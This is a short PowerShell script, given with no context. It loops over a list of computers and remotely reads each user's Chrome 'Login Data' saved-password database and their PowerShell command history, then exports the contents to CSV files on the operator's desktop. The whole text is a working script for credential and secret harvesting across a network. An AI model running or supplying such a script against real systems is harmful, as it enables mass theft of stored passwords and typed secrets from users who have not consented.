foreach($comp in $computers){
    icm -cn $comp -ScriptBlock{
    gc 'C:\users\*\appdata\local\google\chrome\user data\default\login data'
    gc (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
    } | Export-Csv -Path "$env:USERPROFILE\desktop\output\$comp`_files.csv" -NoTypeInformation -Append
}